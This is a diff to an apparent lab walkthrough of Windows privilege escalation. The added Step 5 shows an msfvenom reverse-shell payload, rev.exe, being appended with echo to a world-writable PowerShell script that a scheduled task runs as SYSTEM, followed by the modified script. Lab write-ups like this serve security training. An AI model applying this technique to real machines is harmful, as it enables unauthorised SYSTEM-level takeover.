@@ -137,6 +137,10 @@ C:\> dir
 ```
 I went through each folder one by one looking for anything interesting. Two folders stood out straight away — `BGinfo` and `DevTools`. These are not default Windows folders, so I checked them both.
 
+<p align="center">
+  <img src="images/step1-1.png" width="600">
+</p>
+
 ## Step 2 — Finding the Vulnerable Script in DevTools
 
 ```bash
@@ -205,6 +209,35 @@ RW C:\DevTools\CleanUp.ps1
 ```
 All permission was wide open. I could write whatever I wanted into CleanUp.ps1. Since the scheduled task runs this script every minute as SYSTEM, any command I add will run as SYSTEM automatically.
 
+<p align="center">
+  <img src="images/step4-1.png" width="600">
+</p>
+
 ## Step 5 — Injecting the Payload into CleanUp.ps1
 
-I appended my malicious payload to the end of the script using a simple echo command:
+I had already created a payload named rev.exe using **msfvenom** and saved it to `C:\PrivEsc\rev.exe`.
+I uploaded the payload from my Kali machine to the victim using Meterpreter.
+Next, I appended the payload to the end of the CleanUp.ps1 script using the following command:
+
+```bash
+C:\DevTools> echo C:\privEsc\rev.exe >> C:\DevTools\CleanUp.ps1
+```
+I verified that the script had been modified by checking its file size:
+
+```bash
+C:\DevTools> dir
+```
+```
+06/23/2026  10:00 PM               194 CleanUp.ps1
+```
+The file size increased from `173` bytes to `194` **bytes**, confirming that the payload had been successfully appended.
+
+**The script now looked like this:**
+```
+# This script will clean up all your old dev logs every minute.
+# To avoid permissions issues, run as SYSTEM (should probably fix this later)
+
+Remove-Item C:\DevTools\*.log
+C:\privEsc\rev.exe
+```
+The last line was my payload. The next time the scheduled task runs the script, it will hit that line and execute `rev.exe` as `SYSTEM`.
